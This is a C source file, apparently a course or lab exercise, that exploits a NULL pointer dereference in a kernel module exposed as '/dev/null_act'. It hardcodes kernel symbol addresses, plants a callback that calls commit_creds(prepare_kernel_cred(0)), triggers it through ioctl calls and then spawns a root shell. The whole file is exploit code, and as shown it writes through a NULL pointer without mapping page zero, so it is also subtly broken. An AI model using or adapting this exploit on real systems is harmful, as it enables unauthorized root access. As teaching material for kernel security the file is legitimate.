#define _GNU_SOURCE

#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/ioctl.h>

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR 0xffffffff81084370lu
#define PREPARE_KERNEL_CRED_PTR 0xffffffff810845a0lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

// get root permission
void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
	commit_creds(prepare_kernel_cred(0));
}
// copy the definition of null_item_t  from mod
struct null_t
{
	struct null_item_t *item;
};

struct null_item_t
{
	uint32_t foo;
	void (*callback)(void);
	char bar[1];
};
/* ========================================================================== */

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL};
	int status = 0;

	pid = fork();

	if (pid < 0)
	{
		perror("[-] fork()");
		return;
	}

	if (pid == 0)
	{
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}
// pad the buffer with the call back poiter to root_it
void init_payload(void *p)
{
	struct null_item_t *item = (struct null_item_t *)p;

	item->callback = (uint64_t)root_it;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback %lx\n", item->callback);
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = open("/dev/null_act", O_WRONLY);
	if (fd == -1)
		perror("[-] open failed\n");
	/* Fill your code to set a null pointer */
	char *p = malloc(0x400);
	p = NULL;
	// Modify content at the address 0 or NULL before triggering NULL Pointer Dereference
	init_payload(p);

	/* Fill your code to dereference a null pointer */
	ret = ioctl(fd, 0x40001);
	if (ret != 0)
		perror("[-] NULL_ACT_ALLOC failed\n");
	else
		printf("NULL_ACT_ALLOC success\n");
	ret = ioctl(fd, 0x40004);
	if (ret != 0)
		perror("[-] NULL_ACT_RESET failed\n");
	else
		printf("NULL_ACT_RESET success\n");
	printf("set a null pointer\n");
	ret = ioctl(fd, 0x40002);
	if (ret != 0)
		perror("[-] NULL_ACT_CALLBACK failed\n");
	else
		printf("NULL_ACT_CALLBACK success\n");
	/* You can call this to invoke a root shell */
	if (getuid() == 0 && geteuid() == 0)
	{
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	}
	else
	{
		printf("[-] didn't get root\n");
		goto end;
	}
end:
	return ret;
}
